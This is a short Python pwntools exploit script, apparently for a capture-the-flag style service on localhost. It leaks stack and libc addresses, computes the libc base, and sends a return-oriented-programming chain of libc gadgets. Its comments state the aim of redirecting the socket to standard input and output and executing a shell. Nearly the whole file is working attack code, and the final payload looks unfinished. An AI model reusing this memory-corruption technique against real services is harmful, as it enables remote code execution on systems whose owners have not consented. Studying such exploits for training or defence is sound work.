from pwn import *
from time import sleep

r = remote('localhost', 8081)

r.sendline("64")
r.sendline("a"*15)

resp = r.recv()
read = u64(resp[16:24])
stack = u64(resp[32:40])
libc = u64(resp[56:64])

# attackbuffer = stackleak - 272

stackleak = 32

# Use the first read+write to get a valid stack and libc address.
libc_offset = 133168
libc = libc - libc_offset

# 88 bytes between rsp and our buffer.
# 0x0000000000018809: ret 0x17;
# 0x0000000000008658: ret 0x53;

print("read @ {:016x}".format(read))
print("stack @ {:016x}".format(stack))
print("libc @ {:016x}".format(libc))

buf = stack-272

# break @ 400d1d

# pop rax; mov rsi, qword ptr [rsp + 0x48]; mov rdi, qword ptr [rsp + 0x40]; mov rax, qword ptr [rsp + 0x30]; call rax;
# 3. 0x00000000000d20f2: push rdi; ret;
# 0x0000000000026ca1: pop rax; mov rsi, qword ptr [rsp + 0x48]; mov rdi, qword ptr [rsp + 0x40]; mov rax, qword ptr [rsp + 0x30]; call rax;

# 1. Take control of the stack and program counter.
# 2. Call close and dup (The socket is already given as input.)
# 3. Exec a shell.

"""
close(0);
close(1);
close(2);

if ( dup(sck) != 0 || dup(sck) != 1 || dup(sck) != 2 ) {
    perror("error duplicating socket for stdin/stdout/stderr");
    exit(1);
}
"""

r.sendline("256")
stack = libc+0x0000000000008658
chain = libc+0x0000000000026ca1
r.send("a"*16+p64(chain)+p64(stack)+"a"*150)

